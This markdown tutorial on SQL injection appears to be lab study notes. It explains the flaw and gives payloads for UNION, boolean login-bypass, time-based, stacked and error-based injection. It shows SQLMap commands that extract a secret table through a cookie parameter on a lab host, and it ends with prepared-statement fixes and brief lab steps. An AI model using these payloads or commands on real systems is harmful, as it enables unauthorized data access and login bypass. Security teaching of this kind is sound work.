# SQL Injection

## Theory

### What is SQL Injection?

**SQL Injection** is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. By manipulating SQL queries, an attacker can:

- Bypass authentication and impersonate users  
- Access sensitive data (user info, payment data, etc.)  
- Modify or delete data  
- Launch attacks on the internal network protected by a firewall  

It is considered one of the **most critical** security vulnerabilities.

---

### Example: How SQL Injection Looks

Suppose we have a `Users` table and a script that retrieves a username by `userId`:

```java
String sqlQuery = "SELECT username FROM Users WHERE userId=" + req.getParameter("id");
Statement stmt = conn.createStatement();
ResultSet res = stmt.executeQuery(sqlQuery);
```

If we call:  
```
http://www.hacktory.lab/getUsernameById?id=1
```

The query executed will be:
```sql
SELECT username FROM Users WHERE userId=1
```

Output: **Bob**

![image](https://github.com/user-attachments/assets/67464031-7b35-4d9e-83aa-aaba20e17346)

---

## Exploitation Techniques

### 1. UNION-Based Injection

To combine results from different tables using the `UNION` operator, the number of columns in both queries must match.

#### 🔍 Finding the Number of Columns

**Method 1: Try Adding Columns**

```sql
?id=1 UNION SELECT 1          -- ❌ Error  
?id=1 UNION SELECT 1,2        -- ❌ Error  
?id=1 UNION SELECT 1,2,3      -- ✅ No error → 3 columns
```

**Method 2: Use GROUP BY**

```sql
?id=1 GROUP BY 2              -- ❌ Error  
?id=1 GROUP BY 5              -- ❌ Error  
?id=1 GROUP BY 3              -- ✅ No error → 3 columns
```

---

### 2. Boolean-Based Injection

Evaluate true/false logic in SQL and observe the application's response.

#### Example: Login Bypass

```java
String.format("SELECT * FROM users WHERE name='%s' and password='%s'", name, password);
```

Injected Input:

```java
name = "1' OR '1'='1'; --"
password = "1"
```

Final Query:

```sql
SELECT * FROM users WHERE name='1' OR '1'='1'; --' AND password='1'
```

---

### 3. Time-Based Injection

This technique measures response delay to infer conditions.

#### Example

Original Query:

```sql
SELECT login FROM users WHERE id='$_GET['id']';
```

Injected Input:

```sql
1' AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0) --
```

Executed Query:

```sql
SELECT login FROM users WHERE id='1' AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0) -- ';
```

If the condition is true, the server delays for 15 seconds — indicating successful injection.

---

### 4. Stacked Queries (MSSQL)

Allows executing multiple queries separated by semicolons.

#### Example

```sql
SELECT login FROM users WHERE id='$_GET['id']';
```

Injected Input:

```sql
1'; SELECT password FROM users WHERE id='1
```

Executed:

```sql
SELECT login FROM users WHERE id='1'; SELECT password FROM users WHERE id='1';
```

---

### 5. Error-Based Injection

Leaks data through verbose error messages.

#### Example

```sql
SELECT name, email FROM users WHERE id='1' AND extractvalue(rand(), concat(0x3a, version())) -- 
```

The error will include the database version.

---

### 6. Cookie-Based Blind Injection Example

A vulnerable app stores user data in a cookie that is later used in SQL queries.

#### Example Request (captured via Burp Suite):

```
POST / HTTP/1.1
Host: www.hacktory.lab
Cookie: PHPSESSID=eb4k51cftnulvdksn5n12jcllc; name=Alex1234
Content-Type: application/x-www-form-urlencoded

message=Hi+there
```

The `name` cookie parameter is vulnerable to SQL injection.

---

### Using SQLMap to Exploit

Run SQLMap:

```bash
sqlmap --url "http://www.hacktory.lab/" --cookie="name=*" --dbs
```

- `--cookie="name=*"`: Inject into the `name` parameter
- `--dbs`: List databases

**Output:**

```
available databases [2]:
[*] comments
[*] information_schema
```

Next, enumerate tables in `comments`:

```bash
sqlmap --url "http://www.hacktory.lab/" --cookie="name=*" -D comments --tables
```

**Output:**

```
[2 tables]
+--------------+
| secret_files |
| posts        |
+--------------+
```

Extract data:

```bash
sqlmap --url "http://www.hacktory.lab/" --cookie="name=*" --batch -D comments -T secret_files --sql-shell
```

And in the SQL shell:

```sql
SELECT * FROM secret_files;
```

✅ Success: Sensitive data is extracted using a blind injection on the cookie parameter.

---

## Fixes and Prevention

### Primary Measures

- Use **prepared statements** and **parameterized queries**.
- Prefer **ORMs (Object-Relational Mappers)**.
- Use **built-in framework query functions**.

#### ❌ Vulnerable Example:

```java
String sqlQuery = String.format("SELECT username FROM Users WHERE userId='%s'", req.getParameter("id"));
Statement stmt = conn.createStatement();
ResultSet res = stmt.executeQuery(sqlQuery);
```

#### ✅ Fixed with Prepared Statements:

```java
String query = "SELECT username FROM Users WHERE userId = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, req.getParameter("id"));
ResultSet rs = stmt.executeQuery();
```

### Additional Recommendations

- Apply the **Principle of Least Privilege** on database accounts.
- Use **input validation** with whitelisting wherever possible.
- Sanitize and encode all user-supplied input.
- Use **Web Application Firewalls (WAFs)** to catch injection attempts.

---

> ✅ **Always validate, sanitize, and never trust user input.**

## LAB1:Bully
- Open the machine
- Open the firfox
- Test the login admin admin
- see the answer in the burb
- we can see the input is direclty in the sql
- inject this ' OR '1'='1' -- 
 see the flag save it and save note s
goood luck
